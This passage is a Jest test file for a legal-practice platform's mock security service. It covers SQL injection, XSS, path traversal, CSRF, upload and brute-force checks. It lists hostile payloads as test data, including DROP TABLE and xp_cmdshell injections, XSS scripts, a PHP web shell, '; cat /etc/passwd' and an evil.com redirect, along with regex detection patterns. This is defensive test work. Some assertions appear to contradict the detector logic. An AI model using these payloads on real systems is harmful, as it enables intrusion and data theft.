// =====================================================
// Prima Facie - Security Vulnerability Tests
// Tests for SQL injection, XSS, CSRF, and other security vulnerabilities
// =====================================================

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals'

// Mock interfaces for security testing
interface SecurityTestRequest {
  method: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH'
  url: string
  headers: Record<string, string>
  body?: any
  query?: Record<string, string>
  params?: Record<string, string>
  cookies?: Record<string, string>
  ip: string
  user_agent: string
}

interface SecurityTestResponse {
  status: number
  headers: Record<string, string>
  body: any
  cookies?: Record<string, string>
}

interface VulnerabilityTest {
  name: string
  type: 'SQL_INJECTION' | 'XSS' | 'CSRF' | 'INPUT_VALIDATION' | 'FILE_UPLOAD' | 'AUTHORIZATION'
  payload: string
  expected_blocked: boolean
  severity: 'low' | 'medium' | 'high' | 'critical'
}

interface SecurityValidationRule {
  field: string
  type: 'string' | 'number' | 'email' | 'url' | 'uuid' | 'json'
  required: boolean
  max_length?: number
  min_length?: number
  pattern?: string
  sanitize: boolean
  allow_html: boolean
}

// Common vulnerability test payloads
const VULNERABILITY_PAYLOADS: VulnerabilityTest[] = [
  // SQL Injection Tests
  {
    name: 'Basic SQL Injection',
    type: 'SQL_INJECTION',
    payload: "'; DROP TABLE users; --",
    expected_blocked: true,
    severity: 'critical'
  },
  {
    name: 'Union-based SQL Injection',
    type: 'SQL_INJECTION',
    payload: "' UNION SELECT username, password FROM users --",
    expected_blocked: true,
    severity: 'critical'
  },
  {
    name: 'Blind SQL Injection',
    type: 'SQL_INJECTION',
    payload: "' AND 1=1 --",
    expected_blocked: true,
    severity: 'high'
  },
  {
    name: 'Time-based SQL Injection',
    type: 'SQL_INJECTION',
    payload: "'; WAITFOR DELAY '00:00:05' --",
    expected_blocked: true,
    severity: 'high'
  },
  {
    name: 'PostgreSQL Function Injection',
    type: 'SQL_INJECTION',
    payload: "'; SELECT pg_sleep(5); --",
    expected_blocked: true,
    severity: 'high'
  },
  
  // XSS Tests
  {
    name: 'Basic XSS Script Tag',
    type: 'XSS',
    payload: '<script>alert("XSS")</script>',
    expected_blocked: true,
    severity: 'high'
  },
  {
    name: 'XSS with JavaScript URI',
    type: 'XSS',
    payload: 'javascript:alert("XSS")',
    expected_blocked: true,
    severity: 'high'
  },
  {
    name: 'XSS with Event Handler',
    type: 'XSS',
    payload: '<img src="x" onerror="alert(\'XSS\')">',
    expected_blocked: true,
    severity: 'high'
  },
  {
    name: 'XSS with SVG',
    type: 'XSS',
    payload: '<svg onload="alert(\'XSS\')">',
    expected_blocked: true,
    severity: 'high'
  },
  {
    name: 'XSS with Data URI',
    type: 'XSS',
    payload: 'data:text/html,<script>alert("XSS")</script>',
    expected_blocked: true,
    severity: 'high'
  },
  
  // Input Validation Tests
  {
    name: 'Path Traversal',
    type: 'INPUT_VALIDATION',
    payload: '../../../etc/passwd',
    expected_blocked: true,
    severity: 'high'
  },
  {
    name: 'Windows Path Traversal',
    type: 'INPUT_VALIDATION',
    payload: '..\\..\\..\\windows\\system32\\config\\sam',
    expected_blocked: true,
    severity: 'high'
  },
  {
    name: 'Null Byte Injection',
    type: 'INPUT_VALIDATION',
    payload: 'file.txt\x00.jpg',
    expected_blocked: true,
    severity: 'medium'
  },
  {
    name: 'Command Injection',
    type: 'INPUT_VALIDATION',
    payload: '; cat /etc/passwd',
    expected_blocked: true,
    severity: 'critical'
  },
  {
    name: 'LDAP Injection',
    type: 'INPUT_VALIDATION',
    payload: '*)(uid=*))(|(uid=*',
    expected_blocked: true,
    severity: 'medium'
  },
  
  // File Upload Tests
  {
    name: 'PHP Shell Upload',
    type: 'FILE_UPLOAD',
    payload: '<?php system($_GET["cmd"]); ?>',
    expected_blocked: true,
    severity: 'critical'
  },
  {
    name: 'JavaScript Malware',
    type: 'FILE_UPLOAD',
    payload: '<script>document.location="http://evil.com"</script>',
    expected_blocked: true,
    severity: 'high'
  },
  {
    name: 'SVG with XSS',
    type: 'FILE_UPLOAD',
    payload: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>',
    expected_blocked: true,
    severity: 'high'
  }
]

// Security validation rules for different endpoints
const VALIDATION_RULES: Record<string, SecurityValidationRule[]> = {
  '/api/users': [
    { field: 'email', type: 'email', required: true, max_length: 255, sanitize: true, allow_html: false },
    { field: 'first_name', type: 'string', required: true, max_length: 50, sanitize: true, allow_html: false },
    { field: 'last_name', type: 'string', required: true, max_length: 50, sanitize: true, allow_html: false },
    { field: 'user_type', type: 'string', required: true, pattern: '^(super_admin|law_firm_admin|senior_lawyer|junior_lawyer|paralegal|accountant|client|read_only)$', sanitize: true, allow_html: false }
  ],
  '/api/clients': [
    { field: 'first_name', type: 'string', required: true, max_length: 100, sanitize: true, allow_html: false },
    { field: 'last_name', type: 'string', required: true, max_length: 100, sanitize: true, allow_html: false },
    { field: 'email', type: 'email', required: false, max_length: 255, sanitize: true, allow_html: false },
    { field: 'phone', type: 'string', required: false, max_length: 20, pattern: '^[+]?[0-9\\s\\-\\(\\)]+$', sanitize: true, allow_html: false },
    { field: 'cpf', type: 'string', required: false, pattern: '^[0-9]{3}\\.[0-9]{3}\\.[0-9]{3}-[0-9]{2}$', sanitize: true, allow_html: false }
  ],
  '/api/matters': [
    { field: 'title', type: 'string', required: true, max_length: 200, sanitize: true, allow_html: false },
    { field: 'description', type: 'string', required: false, max_length: 2000, sanitize: true, allow_html: false },
    { field: 'matter_number', type: 'string', required: true, max_length: 50, pattern: '^[A-Z0-9\\-_]+$', sanitize: true, allow_html: false }
  ],
  '/api/documents': [
    { field: 'name', type: 'string', required: true, max_length: 255, sanitize: true, allow_html: false },
    { field: 'description', type: 'string', required: false, max_length: 1000, sanitize: true, allow_html: false }
  ]
}

// Mock Security Service
class MockSecurityService {
  private blocked_ips: Set<string> = new Set()
  private failed_attempts: Map<string, { count: number; last_attempt: number }> = new Map()
  private csrf_tokens: Map<string, { token: string; expires: number }> = new Map()
  
  // Input validation and sanitization
  validateInput(value: any, rule: SecurityValidationRule): { valid: boolean; sanitized: any; errors: string[] } {
    const errors: string[] = []
    let sanitized = value
    
    // Required field validation
    if (rule.required && (!value || value === '')) {
      errors.push(`Field '${rule.field}' is required`)
      return { valid: false, sanitized: null, errors }
    }
    
    if (!value) {
      return { valid: true, sanitized: null, errors: [] }
    }
    
    // Type validation
    switch (rule.type) {
      case 'string':
        if (typeof value !== 'string') {
          errors.push(`Field '${rule.field}' must be a string`)
        }
        break
      case 'number':
        if (typeof value !== 'number' && isNaN(Number(value))) {
          errors.push(`Field '${rule.field}' must be a number`)
        }
        break
      case 'email':
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
        if (!emailRegex.test(value)) {
          errors.push(`Field '${rule.field}' must be a valid email`)
        }
        break
      case 'uuid':
        const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i
        if (!uuidRegex.test(value)) {
          errors.push(`Field '${rule.field}' must be a valid UUID`)
        }
        break
    }
    
    // Length validation
    if (rule.max_length && value.length > rule.max_length) {
      errors.push(`Field '${rule.field}' exceeds maximum length of ${rule.max_length}`)
    }
    
    if (rule.min_length && value.length < rule.min_length) {
      errors.push(`Field '${rule.field}' is below minimum length of ${rule.min_length}`)
    }
    
    // Pattern validation
    if (rule.pattern) {
      const regex = new RegExp(rule.pattern)
      if (!regex.test(value)) {
        errors.push(`Field '${rule.field}' does not match required pattern`)
      }
    }
    
    // Sanitization
    if (rule.sanitize) {
      sanitized = this.sanitizeInput(value, rule.allow_html)
    }
    
    return {
      valid: errors.length === 0,
      sanitized,
      errors
    }
  }
  
  // SQL injection detection and prevention
  detectSQLInjection(input: string): { detected: boolean; patterns: string[] } {
    const sqlPatterns = [
      /('|(\\')|(;)|(--)|(\||\\|)|(\*|\\*)|(\\')|(\\\")|(\"|\\\")/i,
      /(union\s+select)/i,
      /(drop\s+table)/i,
      /(insert\s+into)/i,
      /(delete\s+from)/i,
      /(update\s+.+\s+set)/i,
      /(exec\s*\()/i,
      /(script\s*>)/i,
      /(waitfor\s+delay)/i,
      /(pg_sleep)/i,
      /(benchmark\s*\()/i,
      /(sleep\s*\()/i
    ]
    
    const detectedPatterns: string[] = []
    
    for (const pattern of sqlPatterns) {
      if (pattern.test(input)) {
        detectedPatterns.push(pattern.source)
      }
    }
    
    return {
      detected: detectedPatterns.length > 0,
      patterns: detectedPatterns
    }
  }
  
  // XSS detection and prevention
  detectXSS(input: string): { detected: boolean; patterns: string[] } {
    const xssPatterns = [
      /<script[^>]*>.*?<\/script>/gi,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /<iframe[^>]*>/gi,
      /<object[^>]*>/gi,
      /<embed[^>]*>/gi,
      /<link[^>]*>/gi,
      /<meta[^>]*>/gi,
      /data:text\/html/gi,
      /<svg[^>]*onload/gi,
      /expression\s*\(/gi,
      /vbscript:/gi
    ]
    
    const detectedPatterns: string[] = []
    
    for (const pattern of xssPatterns) {
      if (pattern.test(input)) {
        detectedPatterns.push(pattern.source)
      }
    }
    
    return {
      detected: detectedPatterns.length > 0,
      patterns: detectedPatterns
    }
  }
  
  // Input sanitization
  sanitizeInput(input: string, allowHTML: boolean = false): string {
    if (!allowHTML) {
      // HTML escape
      input = input
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;')
    }
    
    // Remove null bytes
    input = input.replace(/\0/g, '')
    
    // Remove potential command injection characters
    input = input.replace(/[;&|`${}()[\]]/g, '')
    
    return input.trim()
  }
  
  // CSRF protection
  generateCSRFToken(sessionId: string): string {
    const token = this.generateRandomToken(32)
    const expires = Date.now() + (60 * 60 * 1000) // 1 hour
    
    this.csrf_tokens.set(sessionId, { token, expires })
    
    return token
  }
  
  validateCSRFToken(sessionId: string, token: string): boolean {
    const storedData = this.csrf_tokens.get(sessionId)
    
    if (!storedData) {
      return false
    }
    
    if (Date.now() > storedData.expires) {
      this.csrf_tokens.delete(sessionId)
      return false
    }
    
    return storedData.token === token
  }
  
  // File upload security
  validateFileUpload(filename: string, content: string, mimeType: string): { safe: boolean; issues: string[] } {
    const issues: string[] = []
    
    // Check file extension
    const allowedExtensions = ['.pdf', '.doc', '.docx', '.txt', '.png', '.jpg', '.jpeg', '.gif']
    const extension = filename.toLowerCase().substring(filename.lastIndexOf('.'))
    
    if (!allowedExtensions.includes(extension)) {
      issues.push(`File extension '${extension}' is not allowed`)
    }
    
    // Check for double extensions
    const parts = filename.split('.')
    if (parts.length > 2) {
      issues.push('Double file extensions are not allowed')
    }
    
    // Check MIME type
    const allowedMimeTypes = [
      'application/pdf',
      'application/msword',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      'text/plain',
      'image/png',
      'image/jpeg',
      'image/gif'
    ]
    
    if (!allowedMimeTypes.includes(mimeType)) {
      issues.push(`MIME type '${mimeType}' is not allowed`)
    }
    
    // Check for malicious content
    const maliciousPatterns = [
      /<script/i,
      /<\?php/i,
      /<%/i,
      /javascript:/i,
      /vbscript:/i,
      /data:text\/html/i
    ]
    
    for (const pattern of maliciousPatterns) {
      if (pattern.test(content)) {
        issues.push('Malicious content detected in file')
        break
      }
    }
    
    // Check file size (max 10MB)
    if (content.length > 10 * 1024 * 1024) {
      issues.push('File size exceeds maximum limit')
    }
    
    return {
      safe: issues.length === 0,
      issues
    }
  }
  
  // Rate limiting for brute force protection
  checkBruteForce(identifier: string, action: string): { allowed: boolean; lockout_remaining?: number } {
    const key = `${identifier}:${action}`
    const now = Date.now()
    const attempts = this.failed_attempts.get(key)
    
    if (!attempts) {
      return { allowed: true }
    }
    
    // Check if still in lockout period (15 minutes)
    const lockoutPeriod = 15 * 60 * 1000
    if (attempts.count >= 5 && (now - attempts.last_attempt) < lockoutPeriod) {
      const remaining = Math.ceil((lockoutPeriod - (now - attempts.last_attempt)) / 1000)
      return { allowed: false, lockout_remaining: remaining }
    }
    
    // Reset if lockout period has passed
    if ((now - attempts.last_attempt) > lockoutPeriod) {
      this.failed_attempts.delete(key)
      return { allowed: true }
    }
    
    return { allowed: attempts.count < 5 }
  }
  
  recordFailedAttempt(identifier: string, action: string): void {
    const key = `${identifier}:${action}`
    const now = Date.now()
    const attempts = this.failed_attempts.get(key) || { count: 0, last_attempt: 0 }
    
    attempts.count++
    attempts.last_attempt = now
    
    this.failed_attempts.set(key, attempts)
    
    // Block IP after multiple failed attempts from same IP
    if (attempts.count >= 10) {
      this.blocked_ips.add(identifier)
    }
  }
  
  // Path traversal detection
  detectPathTraversal(path: string): { detected: boolean; normalized_path: string } {
    // Normalize the path
    const normalized = path.replace(/\\/g, '/').replace(/\/+/g, '/')
    
    // Check for directory traversal patterns
    const traversalPatterns = [
      /\.\./,
      /\.\.\//,
      /\.\.\\/,
      /~\//,
      /\/etc\//,
      /\/windows\//,
      /\/system32\//
    ]
    
    const detected = traversalPatterns.some(pattern => pattern.test(normalized.toLowerCase()))
    
    return {
      detected,
      normalized_path: normalized
    }
  }
  
  // Process security test request
  processSecurityRequest(request: SecurityTestRequest): SecurityTestResponse {
    const response: SecurityTestResponse = {
      status: 200,
      headers: {
        'X-Frame-Options': 'DENY',
        'X-Content-Type-Options': 'nosniff',
        'X-XSS-Protection': '1; mode=block'
      },
      body: { success: true }
    }
    
    // Check blocked IPs
    if (this.blocked_ips.has(request.ip)) {
      response.status = 403
      response.body = { error: 'IP address blocked' }
      return response
    }
    
    // Validate CSRF token for state-changing operations
    if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(request.method)) {
      const csrfToken = request.headers['x-csrf-token']
      const sessionId = request.cookies?.session_id
      
      if (!sessionId || !csrfToken || !this.validateCSRFToken(sessionId, csrfToken)) {
        response.status = 403
        response.body = { error: 'Invalid CSRF token' }
        return response
      }
    }
    
    // Validate input for known endpoints
    if (request.body && VALIDATION_RULES[request.url]) {
      const rules = VALIDATION_RULES[request.url]
      const validationErrors: string[] = []
      
      for (const rule of rules) {
        const value = request.body[rule.field]
        const validation = this.validateInput(value, rule)
        
        if (!validation.valid) {
          validationErrors.push(...validation.errors)
        }
        
        // Check for SQL injection
        if (typeof value === 'string') {
          const sqlCheck = this.detectSQLInjection(value)
          if (sqlCheck.detected) {
            response.status = 400
            response.body = { error: 'Malicious input detected', type: 'SQL_INJECTION' }
            return response
          }
          
          // Check for XSS
          const xssCheck = this.detectXSS(value)
          if (xssCheck.detected) {
            response.status = 400
            response.body = { error: 'Malicious input detected', type: 'XSS' }
            return response
          }
        }
      }
      
      if (validationErrors.length > 0) {
        response.status = 400
        response.body = { error: 'Validation failed', details: validationErrors }
        return response
      }
    }
    
    // Check path traversal in URL parameters
    if (request.params) {
      for (const [key, value] of Object.entries(request.params)) {
        if (typeof value === 'string') {
          const pathCheck = this.detectPathTraversal(value)
          if (pathCheck.detected) {
            response.status = 400
            response.body = { error: 'Path traversal detected' }
            return response
          }
        }
      }
    }
    
    return response
  }
  
  // Test vulnerability payload
  testVulnerability(test: VulnerabilityTest, endpoint: string): { blocked: boolean; response: SecurityTestResponse } {
    const request: SecurityTestRequest = {
      method: 'POST',
      url: endpoint,
      headers: {
        'content-type': 'application/json',
        'x-csrf-token': 'valid_token'
      },
      body: { test_field: test.payload },
      cookies: { session_id: 'test_session' },
      ip: '192.168.1.100',
      user_agent: 'Security-Test/1.0'
    }
    
    // Generate valid CSRF token for test
    this.generateCSRFToken('test_session')
    this.csrf_tokens.set('test_session', { token: 'valid_token', expires: Date.now() + 3600000 })
    
    const response = this.processSecurityRequest(request)
    
    return {
      blocked: response.status !== 200,
      response
    }
  }
  
  // Helper methods
  private generateRandomToken(length: number): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    let result = ''
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return result
  }
  
  // Get security metrics
  getSecurityMetrics(): any {
    return {
      blocked_ips: this.blocked_ips.size,
      failed_attempts: this.failed_attempts.size,
      active_csrf_tokens: this.csrf_tokens.size
    }
  }
}

describe('Security Vulnerability Tests', () => {
  let securityService: MockSecurityService
  
  beforeEach(() => {
    securityService = new MockSecurityService()
  })
  
  afterEach(() => {
    jest.clearAllMocks()
  })
  
  describe('SQL Injection Prevention', () => {
    it('should detect and block basic SQL injection attempts', () => {
      const sqlPayloads = VULNERABILITY_PAYLOADS.filter(p => p.type === 'SQL_INJECTION')
      
      sqlPayloads.forEach(payload => {
        const detection = securityService.detectSQLInjection(payload.payload)
        
        expect(detection.detected).toBe(true)
        expect(detection.patterns.length).toBeGreaterThan(0)
        
        // Test in actual request
        const test = securityService.testVulnerability(payload, '/api/users')
        expect(test.blocked).toBe(true)
        expect(test.response.body.type).toBe('SQL_INJECTION')
      })
    })
    
    it('should allow safe SQL-like content in legitimate fields', () => {
      const safeInputs = [
        "O'Connor vs Silva Ltd", // Legitimate apostrophe
        "SQL Tutorial for Beginners", // Contains SQL but not injection
        "Email: user@example.com", // Contains at symbol
        "Contract #123-456"
      ]
      
      safeInputs.forEach(input => {
        const detection = securityService.detectSQLInjection(input)
        expect(detection.detected).toBe(false)
      })
    })
    
    it('should handle complex SQL injection patterns', () => {
      const complexPayloads = [
        "1' UNION SELECT version()--",
        "admin'/**/OR/**/1=1--",
        "'; EXEC xp_cmdshell('dir'); --",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
      ]
      
      complexPayloads.forEach(payload => {
        const detection = securityService.detectSQLInjection(payload)
        expect(detection.detected).toBe(true)
      })
    })
    
    it('should protect against blind SQL injection timing attacks', () => {
      const timingPayloads = [
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT pg_sleep(5)--",
        "'; BENCHMARK(5000000,MD5(1))--"
      ]
      
      timingPayloads.forEach(payload => {
        const detection = securityService.detectSQLInjection(payload)
        expect(detection.detected).toBe(true)
      })
    })
  })
  
  describe('Cross-Site Scripting (XSS) Prevention', () => {
    it('should detect and block XSS script injection attempts', () => {
      const xssPayloads = VULNERABILITY_PAYLOADS.filter(p => p.type === 'XSS')
      
      xssPayloads.forEach(payload => {
        const detection = securityService.detectXSS(payload.payload)
        
        expect(detection.detected).toBe(true)
        expect(detection.patterns.length).toBeGreaterThan(0)
        
        // Test in actual request
        const test = securityService.testVulnerability(payload, '/api/clients')
        expect(test.blocked).toBe(true)
        expect(test.response.body.type).toBe('XSS')
      })
    })
    
    it('should sanitize HTML content properly', () => {
      const htmlInputs = [
        '<p>Normal paragraph</p>',
        '<b>Bold text</b>',
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">'
      ]
      
      htmlInputs.forEach(input => {
        const sanitized = securityService.sanitizeInput(input, false)
        
        // Should not contain actual HTML tags
        expect(sanitized).not.toContain('<script')
        expect(sanitized).not.toContain('onerror=')
        expect(sanitized).not.toContain('javascript:')
      })
    })
    
    it('should handle various XSS encoding techniques', () => {
      const encodedPayloads = [
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;'
      ]
      
      encodedPayloads.forEach(payload => {
        const detection = securityService.detectXSS(payload)
        if (payload.includes('script') || payload.includes('javascript:') || payload.includes('data:text/html')) {
          expect(detection.detected).toBe(true)
        }
      })
    })
    
    it('should allow safe rich text content when HTML is permitted', () => {
      const safeHTML = '<p>This is a <b>safe</b> paragraph with <i>emphasis</i>.</p>'
      
      const sanitized = securityService.sanitizeInput(safeHTML, true)
      expect(sanitized).toContain('<p>')
      expect(sanitized).toContain('<b>')
      expect(sanitized).not.toContain('<script')
    })
  })
  
  describe('Input Validation and Sanitization', () => {
    it('should validate required fields', () => {
      const rule: SecurityValidationRule = {
        field: 'email',
        type: 'email',
        required: true,
        max_length: 255,
        sanitize: true,
        allow_html: false
      }
      
      const validation = securityService.validateInput('', rule)
      expect(validation.valid).toBe(false)
      expect(validation.errors).toContain("Field 'email' is required")
    })
    
    it('should validate email format', () => {
      const rule: SecurityValidationRule = {
        field: 'email',
        type: 'email',
        required: true,
        sanitize: true,
        allow_html: false
      }
      
      const validEmail = securityService.validateInput('user@example.com', rule)
      expect(validEmail.valid).toBe(true)
      
      const invalidEmail = securityService.validateInput('invalid-email', rule)
      expect(invalidEmail.valid).toBe(false)
      expect(invalidEmail.errors).toContain("Field 'email' must be a valid email")
    })
    
    it('should enforce field length limits', () => {
      const rule: SecurityValidationRule = {
        field: 'name',
        type: 'string',
        required: true,
        max_length: 50,
        sanitize: true,
        allow_html: false
      }
      
      const longName = 'A'.repeat(100)
      const validation = securityService.validateInput(longName, rule)
      
      expect(validation.valid).toBe(false)
      expect(validation.errors).toContain("Field 'name' exceeds maximum length of 50")
    })
    
    it('should validate patterns (CPF format)', () => {
      const rule: SecurityValidationRule = {
        field: 'cpf',
        type: 'string',
        required: true,
        pattern: '^[0-9]{3}\\.[0-9]{3}\\.[0-9]{3}-[0-9]{2}$',
        sanitize: true,
        allow_html: false
      }
      
      const validCPF = securityService.validateInput('123.456.789-10', rule)
      expect(validCPF.valid).toBe(true)
      
      const invalidCPF = securityService.validateInput('12345678910', rule)
      expect(invalidCPF.valid).toBe(false)
    })
    
    it('should sanitize dangerous characters', () => {
      const input = 'test; rm -rf / && malicious'
      const sanitized = securityService.sanitizeInput(input)
      
      expect(sanitized).not.toContain(';')
      expect(sanitized).not.toContain('&')
      expect(sanitized).not.toContain('|')
    })
  })
  
  describe('CSRF Protection', () => {
    it('should generate and validate CSRF tokens', () => {
      const sessionId = 'test_session_123'
      const token = securityService.generateCSRFToken(sessionId)
      
      expect(token).toBeDefined()
      expect(token.length).toBeGreaterThan(16)
      
      const isValid = securityService.validateCSRFToken(sessionId, token)
      expect(isValid).toBe(true)
    })
    
    it('should reject invalid CSRF tokens', () => {
      const sessionId = 'test_session_123'
      securityService.generateCSRFToken(sessionId)
      
      const isValid = securityService.validateCSRFToken(sessionId, 'invalid_token')
      expect(isValid).toBe(false)
    })
    
    it('should require CSRF tokens for state-changing operations', () => {
      const request: SecurityTestRequest = {
        method: 'POST',
        url: '/api/users',
        headers: { 'content-type': 'application/json' },
        body: { email: 'test@example.com' },
        ip: '192.168.1.100',
        user_agent: 'Test/1.0'
      }
      
      const response = securityService.processSecurityRequest(request)
      
      expect(response.status).toBe(403)
      expect(response.body.error).toBe('Invalid CSRF token')
    })
    
    it('should allow GET requests without CSRF tokens', () => {
      const request: SecurityTestRequest = {
        method: 'GET',
        url: '/api/users',
        headers: {},
        ip: '192.168.1.100',
        user_agent: 'Test/1.0'
      }
      
      const response = securityService.processSecurityRequest(request)
      
      expect(response.status).toBe(200)
    })
  })
  
  describe('File Upload Security', () => {
    it('should validate allowed file extensions', () => {
      const validation = securityService.validateFileUpload('document.pdf', 'PDF content', 'application/pdf')
      expect(validation.safe).toBe(true)
      
      const maliciousValidation = securityService.validateFileUpload('script.php', 'PHP content', 'application/x-php')
      expect(maliciousValidation.safe).toBe(false)
      expect(maliciousValidation.issues).toContain("File extension '.php' is not allowed")
    })
    
    it('should detect malicious file content', () => {
      const phpShell = '<?php system($_GET["cmd"]); ?>'
      const validation = securityService.validateFileUpload('innocent.txt', phpShell, 'text/plain')
      
      expect(validation.safe).toBe(false)
      expect(validation.issues).toContain('Malicious content detected in file')
    })
    
    it('should prevent double extension attacks', () => {
      const validation = securityService.validateFileUpload('image.jpg.php', 'content', 'image/jpeg')
      
      expect(validation.safe).toBe(false)
      expect(validation.issues).toContain('Double file extensions are not allowed')
    })
    
    it('should validate MIME type against file extension', () => {
      const validation = securityService.validateFileUpload('document.pdf', 'content', 'text/html')
      
      expect(validation.safe).toBe(false)
      expect(validation.issues).toContain("MIME type 'text/html' is not allowed")
    })
    
    it('should enforce file size limits', () => {
      const largeContent = 'A'.repeat(11 * 1024 * 1024) // 11MB
      const validation = securityService.validateFileUpload('large.pdf', largeContent, 'application/pdf')
      
      expect(validation.safe).toBe(false)
      expect(validation.issues).toContain('File size exceeds maximum limit')
    })
  })
  
  describe('Path Traversal Prevention', () => {
    it('should detect directory traversal attempts', () => {
      const traversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        '~/../../etc/passwd'
      ]
      
      traversalPayloads.forEach(payload => {
        const detection = securityService.detectPathTraversal(payload)
        expect(detection.detected).toBe(true)
      })
    })
    
    it('should normalize paths safely', () => {
      const path = '/documents/../../../etc/passwd'
      const detection = securityService.detectPathTraversal(path)
      
      expect(detection.detected).toBe(true)
      expect(detection.normalized_path).not.toContain('..')
    })
    
    it('should allow legitimate relative paths', () => {
      const legitimatePaths = [
        'documents/case1/contract.pdf',
        'images/logo.png',
        'reports/2024/january.xlsx'
      ]
      
      legitimatePaths.forEach(path => {
        const detection = securityService.detectPathTraversal(path)
        expect(detection.detected).toBe(false)
      })
    })
  })
  
  describe('Brute Force Protection', () => {
    it('should allow normal authentication attempts', () => {
      const check = securityService.checkBruteForce('user@example.com', 'login')
      expect(check.allowed).toBe(true)
    })
    
    it('should track and limit failed login attempts', () => {
      const identifier = 'attacker@example.com'
      
      // Simulate 5 failed attempts
      for (let i = 0; i < 5; i++) {
        securityService.recordFailedAttempt(identifier, 'login')
      }
      
      const check = securityService.checkBruteForce(identifier, 'login')
      expect(check.allowed).toBe(false)
      expect(check.lockout_remaining).toBeGreaterThan(0)
    })
    
    it('should block IPs after excessive failed attempts', () => {
      const maliciousIP = '192.0.2.100'
      
      // Simulate 10 failed attempts to trigger IP block
      for (let i = 0; i < 10; i++) {
        securityService.recordFailedAttempt(maliciousIP, 'login')
      }
      
      const metrics = securityService.getSecurityMetrics()
      expect(metrics.blocked_ips).toBeGreaterThan(0)
    })
    
    it('should reset lockout after timeout period', () => {
      const identifier = 'test@example.com'
      
      // Simulate failed attempts
      for (let i = 0; i < 5; i++) {
        securityService.recordFailedAttempt(identifier, 'login')
      }
      
      // Should be locked out
      let check = securityService.checkBruteForce(identifier, 'login')
      expect(check.allowed).toBe(false)
      
      // Mock time passing (in real implementation, would wait or mock time)
      // For testing, we'll verify the lockout is recorded
      expect(check.lockout_remaining).toBeGreaterThan(0)
    })
  })
  
  describe('Security Headers', () => {
    it('should include security headers in all responses', () => {
      const request: SecurityTestRequest = {
        method: 'GET',
        url: '/api/users',
        headers: {},
        ip: '192.168.1.100',
        user_agent: 'Test/1.0'
      }
      
      const response = securityService.processSecurityRequest(request)
      
      expect(response.headers['X-Frame-Options']).toBe('DENY')
      expect(response.headers['X-Content-Type-Options']).toBe('nosniff')
      expect(response.headers['X-XSS-Protection']).toBe('1; mode=block')
    })
  })
  
  describe('Comprehensive Vulnerability Testing', () => {
    it('should block all critical vulnerability payloads', () => {
      const criticalPayloads = VULNERABILITY_PAYLOADS.filter(p => p.severity === 'critical')
      
      criticalPayloads.forEach(payload => {
        const test = securityService.testVulnerability(payload, '/api/users')
        
        expect(test.blocked).toBe(true)
        expect(test.response.status).not.toBe(200)
      })
    })
    
    it('should provide appropriate error messages without exposing system details', () => {
      const sqlPayload = VULNERABILITY_PAYLOADS.find(p => p.type === 'SQL_INJECTION')!
      const test = securityService.testVulnerability(sqlPayload, '/api/users')
      
      expect(test.blocked).toBe(true)
      expect(test.response.body.error).toBe('Malicious input detected')
      expect(test.response.body.type).toBe('SQL_INJECTION')
      
      // Should not expose internal details
      expect(test.response.body.error).not.toContain('database')
      expect(test.response.body.error).not.toContain('table')
      expect(test.response.body.error).not.toContain('column')
    })
    
    it('should handle mixed attack payloads', () => {
      const mixedPayload = {
        name: 'Mixed Attack Test',
        type: 'SQL_INJECTION' as const,
        payload: "'; DROP TABLE users; --<script>alert('xss')</script>",
        expected_blocked: true,
        severity: 'critical' as const
      }
      
      const test = securityService.testVulnerability(mixedPayload, '/api/clients')
      
      expect(test.blocked).toBe(true)
      
      // Should be blocked for both SQL injection and XSS
      const sqlDetection = securityService.detectSQLInjection(mixedPayload.payload)
      const xssDetection = securityService.detectXSS(mixedPayload.payload)
      
      expect(sqlDetection.detected).toBe(true)
      expect(xssDetection.detected).toBe(true)
    })
    
    it('should maintain security under load conditions', () => {
      // Simulate multiple concurrent requests with various payloads
      const requests = VULNERABILITY_PAYLOADS.map(payload => 
        securityService.testVulnerability(payload, '/api/matters')
      )
      
      requests.forEach(result => {
        expect(result.blocked).toBe(true)
      })
      
      // Security service should still be responsive
      const metrics = securityService.getSecurityMetrics()
      expect(metrics).toBeDefined()
    })
  })
  
  describe('Legal Data Protection Security', () => {
    it('should apply extra security to privileged attorney-client data', () => {
      const privilegedDataRule: SecurityValidationRule = {
        field: 'privileged_communication',
        type: 'string',
        required: true,
        max_length: 5000,
        sanitize: true,
        allow_html: false
      }
      
      // Test with potentially dangerous content
      const dangerousContent = '<script>steal_client_data()</script>Confidential legal advice...'
      const validation = securityService.validateInput(dangerousContent, privilegedDataRule)
      
      expect(validation.valid).toBe(true) // Valid after sanitization
      expect(validation.sanitized).not.toContain('<script>')
      expect(validation.sanitized).toContain('Confidential legal advice')
    })
    
    it('should detect attempts to access Brazilian legal document patterns', () => {
      const legalPatterns = [
        'CPF: 123.456.789-10',
        'OAB/SP 123456',
        'Processo nº 1234567-89.2024.8.26.0001'
      ]
      
      legalPatterns.forEach(pattern => {
        // These should be allowed as legitimate legal data
        const sqlCheck = securityService.detectSQLInjection(pattern)
        const xssCheck = securityService.detectXSS(pattern)
        
        expect(sqlCheck.detected).toBe(false)
        expect(xssCheck.detected).toBe(false)
      })
    })
    
